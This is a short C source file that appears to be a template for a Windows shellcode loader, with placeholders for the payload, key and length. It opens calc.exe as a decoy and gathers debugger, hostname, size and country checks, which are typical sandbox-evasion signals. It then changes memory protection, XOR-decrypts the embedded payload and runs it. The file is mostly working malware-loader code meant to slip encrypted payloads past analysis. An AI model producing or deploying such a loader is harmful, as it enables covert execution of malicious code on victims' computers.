#include <windows.h>
#include "config.h"
#include <stdio.h>

__attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
    int is_debugged = d();
    int size = z();
    char *hostname = h();
    char *country = c();

    char k[] = "%KEY%";
    size_t k_len = strlen(k);
    short l =  %LENGTH%;
    
    printf("is_debugged: %d\n", is_debugged);
    printf("hostname: %s\n", hostname);
    printf("size: %d\n", size);
    printf("country: %s\n", country);


    size_t ss = sizeof(msgbox_payload);
    // Manipuler la mémoire via VirtualProtect
    DWORD oldProtect;
    if (!VirtualProtect(msgbox_payload, ss, PAGE_READWRITE, &oldProtect)) {
        printf("Erreur lors de VirtualProtect: %lu\n", GetLastError());
        return;
    }

    // XORer le contenu de msgbox
    for (size_t i = 0; i < ss; ++i) {
        msgbox_payload[i] ^= k[i % k_len];  // XOR avec 0xFF
    }


    ((void (*)())msgbox_payload)();
}

/*
https://asecuritysite.com/hash/ror13

*/

